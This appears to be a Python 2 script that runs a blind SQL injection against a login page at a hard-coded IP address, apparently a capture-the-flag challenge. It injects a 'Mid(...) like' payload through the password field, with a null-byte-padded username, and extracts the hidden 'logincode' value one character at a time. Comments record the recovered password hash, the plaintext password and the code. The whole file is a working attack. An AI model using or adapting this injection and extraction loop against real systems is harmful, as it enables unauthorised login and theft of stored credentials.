#coding:utf-8
import urllib2
import requests
import urllib 

# reload(sys)
# sys.setdefaultencoding("utf-8") 
url = "http://104.224.169.128:801/tasks/dm2/login123.php?act=login"
char = "0123456789abcdef"
dic = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
#data = {'username':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%00','email':'','password':'or Mid(password,1,1) like 0b100101) --%20','Submit':'Submit'}
hea = {'Host': '104.224.169.128:801',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '104',
		'cookie':''}

def fuck(x,y,z):
	data = {'username':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00',
		'password':'or Mid({},{},1) like {})-- '.format(x,y,bin(ord(z))),
		'Submit':'Submit'}
	r = requests.post(url=url,data=data)
	# print r.content.decode("utf8","ignore").encode("gbk","ignore") 
	if 'admin' in r.content:
		return z
	else:
		return False

def fuck2():
	data = {'username':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00',
		'password':'or 1 like 1)-- ',
		'Submit':'Submit'}
	data = urllib.urlencode(data) 
	req = urllib2.Request(url, data)
	response = urllib2.urlopen(req)
	print response.read().decode("utf8","ignore").encode("gbk","ignore") 


pwd = '' #[>]password: 23b4222d2613a2765d4d432d2d65e88e  hackme
         #[>]logincode: e3skbvcp8zrq 12
for i in range(1,33):
	for j in dic:
		if fuck('logincode',i,j):
			pwd += j
			print '[>]logincode:',pwd,i
			break

